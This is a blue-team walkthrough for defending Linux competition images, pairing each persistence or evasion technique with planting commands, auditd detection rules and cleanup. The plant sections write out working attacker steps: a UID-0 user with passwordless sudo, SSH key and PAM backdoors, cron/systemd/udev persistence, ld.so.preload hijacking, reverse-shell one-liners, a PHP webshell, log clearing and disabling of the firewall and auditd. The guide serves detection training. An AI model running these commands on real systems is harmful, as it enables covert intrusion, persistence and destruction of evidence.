# Linux Persistence & Evasion — Blue Team Walkthroughs for CCDC

Research + test guide for defending Linux images. Every technique has three
parts: **PLANT** (exactly what the red team does — use it to test your own
detections on a practice image), **DETECT** (auditd rules, hunting queries,
what should fire), and **CLEAN** (removal). The companion
`linux-sim/simulate.sh` automates planting these at intervals so you can
score your monitoring against a ground-truth log.

Sources are linked per section. Core references:
[Elastic Security Labs — A Primer on Persistence Mechanisms](https://www.elastic.co/security-labs/threat-command/primer-on-persistence-mechanisms)
and its [continuation (LD_PRELOAD, udev, binaries)](https://www.elastic.co/security-labs/threat-command/continuation-on-persistence-mechanisms),
[PANIX — Linux persistence emulation framework](https://github.com/Aegrah/PANIX),
[pberba's Linux persistence hunting series](https://pberba.github.io/security/2021/11/23/linux-threat-hunting-for-persistence-account-creation-manipulation/),
[Sandfly — memfd_create forensics](https://sandflysecurity.com/blog/detecting-linux-memfd-create-fileless-malware-with-command-line-forensics),
[Neo23x0 auditd best-practice config](https://gist.github.com/Neo23x0/9fe88c0c5979e017a389b90fd19ddfee),
[Elastic — Linux detection engineering with auditd](https://www.elastic.co/security-labs/blog/linux-detection-engineering-with-auditd).

> **Scope**: everything here assumes a practice/competition image you own.
> The plant commands create marked, benign artifacts (`ccdc-sim` tags) —
> they never phone home; beacons in the sim connect to loopback only.

---

## 0. Baseline before the red team touches anything (do this FIRST)

Within the first hour of CCDC (you get a head start — [CCDC overview](https://jakegines.in/blog/2024/ccdc/)):

```bash
# 1. snapshot the persistence surface (your diff baseline for the whole event)
mkdir -p /root/baseline && chmod 700 /root/baseline
tar czf /root/baseline/persist-$(date +%s).tgz \
    /etc/passwd /etc/shadow /etc/sudoers /etc/sudoers.d /etc/cron* /var/spool/cron \
    /etc/systemd /usr/lib/systemd /lib/systemd /etc/udev /etc/profile.d /etc/rc.local \
    /root/.ssh /home/*/.ssh /etc/ssh/sshd_config /etc/ld.so.preload 2>/dev/null

# 2. turn on auditd with detection rules (below)
# 3. ship logs off-box (rsyslog to your SIEM box) — red team wipes local logs
```

**auditd rules to install** (`/etc/audit/rules.d/ccdc.rules`, then
`augenrules --load`) — these catch nearly every plant in this guide:

```
## identity
-w /etc/passwd -p wa -k identity
-w /etc/shadow -p wa -k identity
-w /etc/group  -p wa -k identity
-w /etc/gshadow -p wa -k identity
-w /etc/sudoers -p wa -k identity
-w /etc/sudoers.d/ -p wa -k identity
## schedulers + init
-w /etc/cron.d/ -p wa -k scheduler
-w /etc/cron.daily/ -p wa -k scheduler
-w /etc/cron.hourly/ -p wa -k scheduler
-w /etc/cron.weekly/ -p wa -k scheduler
-w /etc/cron.monthly/ -p wa -k scheduler
-w /var/spool/cron/ -p wa -k scheduler
-w /etc/systemd/system/ -p wa -k systemd
-w /usr/lib/systemd/system/ -p wa -k systemd
-w /etc/rc.local -p wa -k boot
-w /etc/init.d/ -p wa -k boot
## execution hijack
-w /etc/ld.so.preload -p wa -k ldpreload
-w /etc/profile.d/ -p wa -k shellhijack
-w /root/.bashrc -p wa -k shellhijack
-w /root/.profile -p wa -k shellhijack
-w /home/ -p wa -k homedir
## ssh
-w /root/.ssh/ -p wa -k ssh
-w /etc/ssh/sshd_config -p wa -k ssh
## udev
-w /etc/udev/rules.d/ -p wa -k udev
## firewall / logs (the "delete evidence" moves)
-w /etc/ufw/ -p wa -k firewall
-w /etc/firewalld/ -p wa -k firewall
-w /var/log/ -p wa -k logs
-w /etc/audit/ -p wa -k audit
-w /etc/auditd.conf -p wa -k audit
## exec accounting (who ran what)
-a always,exit -F arch=b64 -S execve -k exec
## users that get added -> their processes are instantly interesting
```

(Adapted from [Neo23x0's auditd config](https://gist.github.com/Neo23x0/9fe88c0c5979e017a389b90fd19ddfee)
and [Elastic's auditd detection engineering](https://www.elastic.co/security-labs/blog/linux-detection-engineering-with-auditd).)

---

## 1. Account persistence

### 1.1 Rogue user with UID 0  (MITRE T1136.001 / T1078)

**PLANT**
```bash
# duplicate-root: a second passwd entry with UID 0 (classic CCDC move)
useradd -o -u 0 -g 0 -s /bin/bash -M ccdc-sim 2>/dev/null
echo 'ccdc-sim:$6$xyz$MARKEDHASHVALUE0000000000000000000000000000:...' >> /etc/shadow
# passwordless sudo drop-in:
echo 'ccdc-sim ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/ccdc-sim
```

**DETECT**
- auditd: `identity` key fires on `/etc/passwd` write; `ausearch -k identity`.
- Hunt: `awk -F: '($3==0)&&($1!="root")' /etc/passwd` — any output = compromise
  ([pberba part 2 — account creation/manipulation](https://pberba.github.io/security/2021/11/23/linux-threat-hunting-for-persistence-account-creation-manipulation/)).
- Diff against your section-0 tarball: `tar dzf /root/baseline/persist-*.tgz`.

**CLEAN**
```bash
userdel -f ccdc-sim; rm -f /etc/sudoers.d/ccdc-sim
sed -i '/ccdc-sim/d' /etc/passwd /etc/shadow   # belt and suspenders
```

### 1.2 SSH authorized_keys  (T1098.004)

The single most common CCDC Linux persistence — survives password changes
([SSH persistence detection/removal](https://linuxsecurity.com/features/ssh-persistence-detection-removal-linux)).

**PLANT**
```bash
mkdir -p /root/.ssh && chmod 700 /root/.ssh
echo 'ssh-ed25519 AAAA...ccdc-sim... user@host' >> /root/.ssh/authorized_keys
# sneaky variants the red team uses:
echo 'no-port-forwarding,command="echo sleep",permitopen="host:22" ssh-ed25519 AAAA...' >> /root/.ssh/authorized_keys
touch /root/.ssh/authorized_keys2      # legacy file sshd still reads on some builds
# also check EVERY user, not just root:
for h in /home/*; do echo $h/.ssh/authorized_keys; done
```

**DETECT**
- auditd `ssh`/`homedir` keys on `.ssh` writes.
- Hunt: any key whose comment/comment you don't recognize; keys with
  `command=` restrictions (forced-command backdoors); file mtimes newer than
  your baseline.
- [Elastic hunting query — persistence via SSH configurations and keys](https://github.com/elastic/detection-rules/blob/main/hunting/linux/queries/persistence_via_ssh_configurations_and_keys.toml).

**CLEAN** — remove the line (not the whole file — you may lock yourself out):
```bash
sed -i.bak '/ccdc-sim/d' /root/.ssh/authorized_keys
rm -f /root/.ssh/authorized_keys2
```

### 1.3 PAM backdoor — pam_unix skeleton key  (T1556.003)

Patches `pam_unix.so` so one magic password authenticates ANY user
([Black Hills — The P in PAM is for Persistence](https://www.blackhillsinfosec.com/the-p-in-pam-is-for-persistence-linux-persistence-technique/)).

**PLANT (test variant)** — on a practice image only:
```bash
cd /tmp && apt-get source libpam-modules   # or fetch matching pam Linux-PAM source
# edit pam_unix_auth.c: if (strcmp(p, "ccdc-sim-magic") == 0) return PAM_SUCCESS;
# build, then swap:
mv /lib/x86_64-linux-gnu/security/pam_unix.so /lib/.../pam_unix.so.bak
cp modules/pam_unix/.libs/pam_unix.so /lib/x86_64-linux-gnu/security/
touch -r /lib/.../pam_unix.so.bak /lib/.../pam_unix.so   # timestomp (see §5.1)
```

**DETECT**
- `md5sum /lib/*/security/pam_unix.so` vs a known-good image / package
  verification: `debsums libpam-modules` / `rpm -V pam`.
- auditd exec + file writes under `/lib/*/security/`.
- auth log anomalies: successful logins with no matching sshd key exchange.

**CLEAN** — restore the `.bak`, re-verify with `debsums`.

---

## 2. Scheduler persistence

### 2.1 cron  (T1053.003)

**PLANT**
```bash
# user crontab (the one people forget to check):
( crontab -l 2>/dev/null; echo '@reboot /usr/local/bin/ccdc-sim-beacon &' ) | crontab -
# system drop-in:
echo '* * * * * root /usr/local/bin/ccdc-sim-beacon' > /etc/cron.d/ccdc-sim
# script-in-dir variant:
echo '#!/bin/sh
/usr/local/bin/ccdc-sim-beacon' > /etc/cron.hourly/ccdc-sim && chmod +x /etc/cron.hourly/ccdc-sim
```

**DETECT**
- auditd `scheduler` key; `ls -la /etc/cron.d /etc/cron.{hourly,daily,weekly,monthly}`.
- `crontab -l -u <user>` for EVERY user; diff vs baseline.
- The payload itself: any script in cron invoking bash -c with base64, or
  connecting out, is a beacon (see §6).

**CLEAN** — `crontab -r` edits: `( crontab -l | grep -v ccdc-sim ) | crontab -`;
`rm /etc/cron.d/ccdc-sim /etc/cron.hourly/ccdc-sim`.

### 2.2 systemd service + timer  (T1501 / T1053.006)

Per [Elastic's primer](https://www.elastic.co/security-labs/threat-command/primer-on-persistence-mechanisms),
systemd is the highest-fidelity Linux persistence: services run at boot, in
user scope without root, and generators re-create units from unexpected dirs.

**PLANT**
```bash
cat > /etc/systemd/system/ccdc-sim.service <<'EOF'
[Unit]
Description=CCDC sim payload
[Service]
Type=simple
ExecStart=/usr/local/bin/ccdc-sim-beacon
Restart=always
[Install]
WantedBy=multi-user.target
EOF
cat > /etc/systemd/system/ccdc-sim.timer <<'EOF'
[Unit]
Description=CCDC sim timer
[Timer]
OnBootSec=2min
OnUnitActiveSec=5min
[Install]
WantedBy=timers.target
EOF
systemctl daemon-reload && systemctl enable --now ccdc-sim.timer
# user-scope variant (NO ROOT NEEDED once you have any user shell):
mkdir -p ~/.config/systemd/user/default.target.wants
cp /etc/systemd/system/ccdc-sim.service ~/.config/systemd/user/
# generator variant — survives systemctl disable:
mkdir -p /run/systemd/system-generators 2>/dev/null || true
```

**DETECT**
- auditd `systemd` key writes.
- `systemctl list-units --type=service --state=running | less`
- `systemctl list-timers --all`
- Diff `/etc/systemd/system/` + `~/.config/systemd/user/` vs baseline.
- PANIX emulates exactly these — point your detections at its output.

**CLEAN** — `systemctl disable --now ccdc-sim.timer ccdc-sim.service;
rm /etc/systemd/system/ccdc-sim.*; systemctl daemon-reload` + remove user-scope copies.

### 2.3 udev rules  (T1546.02 — the sedexp malware technique)

Runs an attacker binary on any device event (plug/unplug, boot) — used by
real Linux malware ([sedexp analysis](https://www.levelblue.com/blogs/spiderlabs-blog/unveiling-sedexp/),
[Elastic continuation](https://www.elastic.co/security-labs/threat-command/continuation-on-persistence-mechanisms)).

**PLANT**
```bash
cat > /etc/udev/rules.d/99-ccdc-sim.rules <<'EOF'
ACTION=="add", RUN+="/usr/local/bin/ccdc-sim-beacon"
EOF
udevadm control --reload
```

**DETECT**
- auditd `udev` key; Sigma: [udev rules persistence](https://rustinel.io/rules/udev-rules-persistence/).
- ANY `RUN+=` in `/etc/udev/rules.d/` pointing outside `/usr/lib/udev` is suspect.

**CLEAN** — `rm /etc/udev/rules.d/99-ccdc-sim.rules && udevadm control --reload`.

---

## 3. Execution hijacking

### 3.1 /etc/ld.so.preload  (T1546.005)

Forces EVERY dynamically-linked binary to load your library — user-space
rootkit territory ([Wiz — dynamic linker hijacking](https://www.wiz.io/blog/linux-rootkits-explained-part-1-dynamic-linker-hijacking)).

**PLANT (test .so that just logs loads)**
```bash
cat > /tmp/hook.c <<'EOF'
#include <stdio.h>
__attribute__((constructor)) void ccdc_sim(void) {
    FILE *f = fopen("/tmp/ccdc-sim-loads.log", "a");
    if (f) { fprintf(f, "loaded into %d\n", getpid()); fclose(f); }
}
EOF
gcc -shared -fPIC -o /usr/local/lib/ccdc-sim.so /tmp/hook.c
echo '/usr/local/lib/ccdc-sim.so' > /etc/ld.so.preload
# DANGER: test this on a VM/snapshot only — a broken preload breaks EVERYTHING.
```

**DETECT**
- auditd `ldpreload` key — the file should not exist on a stock system:
  `test -e /etc/ld.so.preload && echo COMPROMISED`
- Cross-view: `getconf LD_PRELOAD`-inherited env vs `/etc/ld.so.preload`.

**CLEAN** — `rm /etc/ld.so.preload /usr/local/lib/ccdc-sim.so` (single-user
mode if shells are broken).

### 3.2 Shell rc / profile.d  (T1546.004)

**PLANT**
```bash
echo 'nohup /usr/local/bin/ccdc-sim-beacon >/dev/null 2>&1 &' >> /root/.bashrc
echo '/usr/local/bin/ccdc-sim-beacon &' > /etc/profile.d/ccdc-sim.sh
# zsh variant: ~/.zshrc ; ssh-only: ~/.ssh/rc ; logout hook: ~/.bash_logout
```

**DETECT** — auditd `shellhijack`; grep for `&`, `nohup`, `curl|/dev/tcp`
in rc files; diff vs baseline.

**CLEAN** — `sed -i '/ccdc-sim/d' /root/.bashrc; rm /etc/profile.d/ccdc-sim.sh`.

---

## 4. Fileless / memory-only execution  (T1620)

### 4.1 memfd_create — ELF run from anonymous memory

No on-disk artifact at all; `/proc/<pid>/exe` shows `memfd:` (deleted)
([Sandfly forensics](https://sandflysecurity.com/blog/detecting-linux-memfd-create-fileless-malware-with-command-line-forensics),
[Elastic fileless execution repro](https://www.elastic.co/security-labs/threat-command/memfd-create-linux-fileless-execution)).

**PLANT (benign loopback test payload)**
```bash
python3 - <<'EOF'
import ctypes, os
libc = ctypes.CDLL("libc.so.6", use_errno=True)
fd = libc.memfd_create("ccdc-sim", 0)
# tiny prebuilt ELF that loops forever; write it into the memfd and execve
payload = open("/usr/local/bin/ccdc-sim-beacon","rb").read()   # benign sleeper
os.write(fd, payload)
path = f"/proc/self/fd/{fd}"
os.execv(path, [path])
EOF
```

**DETECT**
- `ls -l /proc/*/exe | grep memfd` — any hit = fileless execution.
- auditd execve events whose exe path is `/memfd:` or `/proc/*/fd/*`.
- `find /proc/*/fd -lname 'memfd:*' 2>/dev/null`

### 4.2 Deleted binary  (T1070.004)

Run a binary then delete it — still executes, exe shows `(deleted)`.

**PLANT**
```bash
cp /usr/local/bin/ccdc-sim-beacon /tmp/.x && /tmp/.x & rm /tmp/.x
```

**DETECT** — `ls -l /proc/*/exe | grep '(deleted)'`.

### 4.3 Reverse-shell one-liners the red team drops in cron  (T1059.004)

```bash
bash -i >& /dev/tcp/127.0.0.1/4444 0>&1          # sim: loopback only
0<&196;exec 196<>/dev/tcp/127.0.0.1/4444; sh <&196 >&196 2>&196
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("127.0.0.1",4444));...'
```

**DETECT** — auditd exec events for `bash -c`, `/dev/tcp` in command lines
(needs auditd exec logging + a SIEM regex), outbound sockets from cron/systemd
parents. This is the exact shape our Windows EDR's SPAWN-SHELL +
NET-BEACON rules mirror on the Linux side.

---

## 5. Anti-forensics & evasion

### 5.1 Timestomping  (T1070.006)
**PLANT** `touch -r /etc/passwd /etc/cron.d/ccdc-sim` (copies mtime).
**DETECT** — ctime can't be faked: `stat` shows mtime < ctime = stomped.
(The Windows EDR has TIME-STOMP for exactly this pattern — mtime older than
ctime by a wide margin.)

### 5.2 Immutable files  (T1222 / defense)
**PLANT** `chattr +i /etc/cron.d/ccdc-sim` — your cleanup now fails with
"Operation not permitted" until you notice.
**DETECT** — `lsattr -R /etc /usr/local /var/spool/cron 2>/dev/null | grep '\-i\-'
`; any immutable file you didn't set is hostile. **CLEAN**: `chattr -i <file>` first.

### 5.3 Log clearing  (T1070.002)
**PLANT (test)** `: > /var/log/auth.log; journalctl --vacuum-time=1s; history -c; unset HISTFILE`.
**DETECT** — auditd `logs` key; log FILE SHRINKING (track sizes in your SIEM);
`last` shows reboot you didn't do; auditd `audit` key = someone touching audit
config (an attacker muting your best sensor — treat as critical).

### 5.4 Disabling the firewall "at intervals"  (T1562.004)
The exact move you asked about — automate the check, not just the config:
**PLANT (test)**
```bash
ufw disable                    # Debian/Ubuntu
systemctl stop firewalld       # RHEL family
iptables -F                    # flush rules the brute way
```
**DETECT** — auditd `firewall` key writes; a 2-line watchdog cron the BLUE
team owns:
```bash
* * * * * root /usr/local/bin/fw-watchdog.sh   # re-enables + alerts
```
```bash
#!/bin/sh
# /usr/local/bin/fw-watchdog.sh — re-arms the firewall, screams to syslog
ufw status inactive 2>/dev/null && { ufw enable; logger -p auth.crit "FW-WATCHDOG: firewall was disabled - re-enabled"; }
iptables -L -n 2>/dev/null | grep -q "^Chain INPUT (policy DROP)" || logger -p auth.warning "FW-WATCHDOG: INPUT policy not DROP"
```
Ship the syslog line to your SIEM and alarm on it. (Our EDR's Windows
equivalents: PROC-NETSH-FIREWALL / EVT-NETSH-FIREWALL.)

### 5.5 History + accounting off
**PLANT** `unset HISTFILE; export HISTSIZE=0; chattr +i /root/.bash_history;
service rsyslog stop; systemctl disable --now auditd`.
**DETECT** — auditd `audit` key; empty history for an interactive root
session = tampering; auditd stopping = critical (like our TAMPER-AUDIT rule).

---

## 6. C2 channels on Linux

- **Reverse SSH tunnels**: `ssh -f -N -R 4444:localhost:22 user@host` —
  detect outbound sshd conns from odd users.
- **ICMP/DNS tunnels + raw-packet shells**: watershell-cpp takes commands in
  raw Ethernet frames on a PF_PACKET socket with NO listening port — detect
  `socket(AF_PACKET)` usage by non-root daemons
  (`grep packet /proc/net/packet`, auditd `socketcall`).
  Our Windows EDR already mirrors this: PKT-SOCKET + SIG-WATERSHELL +
  SIG-MINGW ([our watershell research](development-research/) and the
  [RIT Redteam watershell-cpp repo](https://github.com/RITRedteam/watershell-cpp)).
- **Loopback test beacon** for cadence-rule testing (what our NET-BEACON
  detector catches on Windows; on Linux ship netflow/auditd connect events
  to your SIEM and look for periodicity the same way).

---

## 7. Web services (CCDC images almost always run one)

- **Webshells**: `<?php system($_GET['c']); ?>` dropped next to the app —
  hunt with `grep -rEn 'system\(|shell_exec|passthru|eval\(|base64_decode' /var/www`
  weekly + auditd on /var/www. (Our EDR: SIG-WEBSHELL-PHP, FILE-WEBROOT-SHELL.)
- Config tampering: auditd `-w /etc/nginx -w /etc/apache2 -w /etc/httpd`.

---

## 8. Scoring your defenses: the simulator

`linux-sim/simulate.sh` plants a random marked technique every N seconds and
writes ground truth to `linux-sim/actions.log`. The test loop:

1. Start auditd with the section-0 rules on the practice image.
2. `sudo ./simulate.sh --interval 120 --count 20` (or `--all` for one of each).
3. After it finishes, hunt: did your auditd keys / SIEM alerts / baseline
   diff catch each action? Miss anything = detection gap to fix.
4. `sudo ./cleanup.sh` removes every artifact; `verify.sh` proves the box is
   clean (compares against the current baseline).
5. On the Windows side, our EDR's equivalents (SPAWN-SHELL, NET-BEACON,
   TAMPER-*, PERS-*) catch the same technique families — the Windows test
   tranches in `tests/` play the same role as `linux-sim`.

## Sources

- Elastic Security Labs: [persistence primer](https://www.elastic.co/security-labs/threat-command/primer-on-persistence-mechanisms) · [persistence continuation (LD_PRELOAD/udev)](https://www.elastic.co/security-labs/threat-command/continuation-on-persistence-mechanisms) · [auditd detection engineering](https://www.elastic.co/security-labs/blog/linux-detection-engineering-with-auditd) · [fileless execution](https://www.elastic.co/security-labs/threat-command/memfd-create-linux-fileless-execution) · [SSH-keys hunting query](https://github.com/elastic/detection-rules/blob/main/hunting/linux/queries/persistence_via_ssh_configurations_and_keys.toml)
- [PANIX — Linux persistence emulation](https://github.com/Aegrah/PANIX)
- [pberba — persistence hunting series](https://pberba.github.io/security/2021/11/23/linux-threat-hunting-for-persistence-account-creation-manipulation/)
- Sandfly Security: [memfd_create forensics](https://sandflysecurity.com/blog/detecting-linux-memfd-create-fileless-malware-with-command-line-forensics) · [stealth rootkit vs EDR](https://sandflysecurity.com/blog/linux-stealth-rootkit-malware-with-edr-evasion-analyzed)
- Wiz: [dynamic linker hijacking rootkits](https://www.wiz.io/blog/linux-rootkits-explained-part-1-dynamic-linker-hijacking)
- Black Hills: [PAM persistence](https://www.blackhillsinfosec.com/the-p-in-pam-is-for-persistence-linux-persistence-technique/)
- LevelBlue SpiderLabs: [sedexp (udev persistence)](https://www.levelblue.com/blogs/spiderlabs-blog/unveiling-sedexp/)
- [Neo23x0 auditd config](https://gist.github.com/Neo23x0/9fe88c0c5979e017a389b90fd19ddfee) · [RHEL auditing docs](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/security_hardening/auditing-the-system_security-hardening)
- LinuxSecurity: [persistence hunting top-5](https://linuxsecurity.com/features/linux-persistence-hunting-techniques) · [SSH key detection/removal](https://linuxsecurity.com/features/ssh-persistence-detection-removal-linux)
- CCDC context: [jakeginesin CCDC walkthrough](https://jakegines.in/blog/2024/ccdc/) · [Ansible blue-team automation](https://marceltc.com/automating-blue-team-with-ansible-ccdc/) · [CCDC Blueteam Manual](https://github.com/C0nd4/CCDC-Blueteam-Manual)

## Appendix — advanced additions (2025-26 research)

`advanced-evasion-persistence-methods.md` (same directory) extends this
guide with the tier above: eBPF passive backdoors (BPFDoor/LinkPro/J-magic)
with load-time detection primitives, interpreter/package-manager
persistence (sitecustomize.py, apt hooks, gcc specs), sshd semantic
tampering (`sshd -T` hash watchdog), systemd generators/tmpfiles.d,
bind-mount hiding (cross-view checks), and initramfs persistence. Add its
auditd lines to the section-0 baseline:

```
## eBPF backdoors - detect at LOAD time (BPFDoor family)
-a always,exit -F arch=b64 -S bpf -k ebpf
-a always,exit -F arch=b64 -S perf_event_open -k ebpf
-w /proc/sys/kernel/unprivileged_bpf_disabled -p wa -k ebpf
## interpreter + package-manager persistence
-w /usr/lib/python3/dist-packages/ -p wa -k interp
-w /etc/apt/apt.conf.d/ -p wa -k pkg-hooks
-w /usr/lib/rpm/macros -p wa -k pkg-hooks
## systemd beyond units
-w /run/systemd/ -p wa -k systemd
-w /etc/tmpfiles.d/ -p wa -k systemd
```
